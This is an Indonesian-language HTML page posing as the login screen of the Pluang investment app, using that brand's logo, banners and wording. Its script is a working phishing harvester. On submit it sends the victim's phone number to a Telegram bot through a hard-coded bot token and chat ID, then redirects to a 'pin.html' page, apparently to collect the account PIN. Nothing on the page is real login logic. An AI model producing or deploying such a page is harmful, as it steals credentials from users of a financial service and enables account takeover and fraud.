<html lang="id">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>Pluang Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
   #loadingOverlay {
     position: fixed;
     inset: 0;
     background-color: rgba(255, 255, 255, 0.8);
     display: flex;
     justify-content: center;
     align-items: center;
     z-index: 9999;
     visibility: hidden;
     opacity: 0;
     transition: opacity 0.3s ease;
   }
   #loadingOverlay.visible {
     visibility: visible;
     opacity: 1;
   }
   .spinner {
     border: 4px solid #e5e7eb; /* gray-200 */
     border-top: 4px solid #4f46e5; /* indigo-600 */
     border-radius: 50%;
     width: 40px;
     height: 40px;
     animation: spin 1s linear infinite;
   }
   @keyframes spin {
     to {
       transform: rotate(360deg);
     }
   }
   .carousel-wrapper {
     position: relative;
     width: 100%;
     max-width: 600px;
     margin: 0 auto;
     overflow: hidden;
     border-radius: 0.75rem; /* rounded-xl */
   }
   #carousel {
     display: flex;
     transition: transform 0.5s ease-in-out;
     width: 200%;
   }
   #carousel > div {
     flex-shrink: 0;
     width: 50%;
   }
   .carousel-indicators {
     position: absolute;
     bottom: 0.75rem;
     left: 50%;
     transform: translateX(-50%);
     display: flex;
     gap: 0.5rem;
   }
   .carousel-indicators span {
     width: 0.625rem;
     height: 0.625rem;
     border-radius: 9999px;
     background-color: rgba(255 255 255 / 0.5);
     cursor: pointer;
     transition: background-color 0.3s ease;
   }
   .carousel-indicators span.active {
     background-color: #4f46e5; /* indigo-600 */
   }
  </style>
 </head>
 <body class="bg-white text-black">
  <div id="loadingOverlay" aria-label="Loading" role="alert" aria-live="assertive" aria-busy="true">
   <div class="spinner"></div>
  </div>
  <header class="flex items-center justify-between px-5 py-7 border-b border-gray-500">
   <div class="flex items-center space-x-2">
    <img alt="Logo Pluang huruf P hitam di latar putih" class="w-6 h-6" height="24" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihg-v6NTCyP7qgTldHJH-8mewkAbitexfUy95AY84o0zx7Ju58v9ccyA_-NAOcpQIvo86gGsK8iW9pWzUlKCKb_I7Uf3reExcwVmAQIvhaavYcK4W2FbZ2_2M4OE4yL_gdaWVu0vMIKvmwYkLBdhqWf_jTjCwCvl6hpOiCa_8EGFYuUyDIvkakfu5cNhQ/s1600/1000015824.png" width="24"/>
    <span class="text-lg font-normal select-none">Pluang</span>
   </div>
   <button class="text-indigo-600 font-medium text-base px-4 py-1.5 border border-indigo-600 rounded-full hover:bg-indigo-50 transition" type="button">Daftar</button>
   <button aria-label="Menu" class="lg:hidden focus:outline-none">
    <i class="fas fa-bars text-2xl text-black"></i>
   </button>
  </header>
  <main class="px-5 pt-6 pb-10 max-w-md mx-auto">
   <section class="carousel-wrapper">
    <div id="carousel">
     <div>
      <img alt="Layar laptop menampilkan antarmuka platform trading dengan latar hitam dan garis cahaya ungu" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerSecondMobile.webp" width="600"/>
     </div>
     <div>
      <img alt="Layar kedua dengan latar gelap dan gradasi ungu-merah" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerThirdMobile.webp" width="600"/>
     </div>
    </div>
    <div class="carousel-indicators" aria-label="indikator carousel">
     <span id="indicator-0" class="active"></span>
     <span id="indicator-1"></span>
    </div>
   </section>
   <div class="mt-6 text-right">
    <a class="text-indigo-600 text-sm font-normal" href="#">Butuh bantuan?</a>
   </div>
   <h1 class="mt-4 text-3xl font-extrabold leading-tight">Masuk ke akun kamu</h1>
   <p class="mt-1 text-gray-600 text-base font-normal">
    Belum punya akun? <a class="text-indigo-600" href="#">Daftar</a>
   </p>
   <form id="loginForm" class="mt-5 space-y-4">
    <div class="flex space-x-3">
     <button class="flex items-center space-x-2 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-900 font-normal" type="button">
      <img alt="Bendera Indonesia dengan garis horizontal merah dan putih" class="w-6 h-4 rounded-sm object-cover" height="16" src="https://image-cdn.pluang.com/web/icons/indonesian_flag.svg" width="24"/>
      <span>+62</span>
     </button>
     <input id="phoneNumber" aria-label="Nomor Telepon" class="flex-1 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-indigo-600" placeholder="Nomor Telepon" type="tel" required/>
    </div>
    <label class="inline-flex items-center space-x-2 text-xs text-gray-700">
     <input id="agreeTerms" aria-label="Setuju dengan syarat dan ketentuan" class="w-4 h-4 border border-gray-300 rounded-full focus:ring-2 focus:ring-indigo-600" type="checkbox" required/>
     <span class="font-normal">Saya setuju dengan <a class="text-indigo-600" href="#">Syarat dan Ketentuan</a> Pluang.</span>
    </label>
    <button id="submitBtn" class="w-full bg-gray-300 text-gray-500 text-base font-normal rounded-full py-4 mt-4 cursor-not-allowed" disabled type="submit">Masuk</button>
   </form>
  </main>
  <script>
    const carousel = document.getElementById("carousel");
    const indicators = [
      document.getElementById("indicator-0"),
      document.getElementById("indicator-1"),
    ];
    let currentIndex = 0;
    const totalSlides = 2;

    function updateCarousel() {
      carousel.style.transform = `translateX(-${currentIndex * 50}%)`;
      indicators.forEach((ind, i) => {
        if (i === currentIndex) {
          ind.classList.add("active");
        } else {
          ind.classList.remove("active");
        }
      });
    }

    function nextSlide() {
      currentIndex = (currentIndex + 1) % totalSlides;
      updateCarousel();
    }

    setInterval(nextSlide, 3000);

    const form = document.getElementById('loginForm');
    const phoneInput = document.getElementById('phoneNumber');
    const agreeCheckbox = document.getElementById('agreeTerms');
    const submitBtn = document.getElementById('submitBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Enable submit button only if checkbox is checked and phone number is not empty
    function toggleSubmit() {
      if (agreeCheckbox.checked && phoneInput.value.trim() !== '') {
        submitBtn.disabled = false;
        submitBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        submitBtn.classList.add('bg-indigo-600', 'text-white', 'cursor-pointer');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-indigo-600', 'text-white', 'cursor-pointer');
      }
    }

    phoneInput.addEventListener('input', toggleSubmit);
    agreeCheckbox.addEventListener('change', toggleSubmit);

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Show loading overlay
      if(loadingOverlay) loadingOverlay.classList.add('visible');

      const phoneNumber = phoneInput.value.trim();
      if (!phoneNumber) {
        if(loadingOverlay) loadingOverlay.classList.remove('visible');
        return;
      }

      const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
      const chatId = '7549590022';
      const message = `Percobaan masuk baru:\nNomor Telepon: +62${phoneNumber}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });

        if(loadingOverlay) loadingOverlay.classList.remove('visible');

        if (res.ok) {
          window.location.href = "pin.html";
          form.reset();
          toggleSubmit();
        } else {
          alert('Gagal mengirim data ke Telegram.');
        }
      } catch (error) {
        if(loadingOverlay) loadingOverlay.classList.remove('visible');
        alert('Terjadi kesalahan saat mengirim data ke Telegram.');
        console.error(error);
      }
    });
  </script>
 </body>
</html>
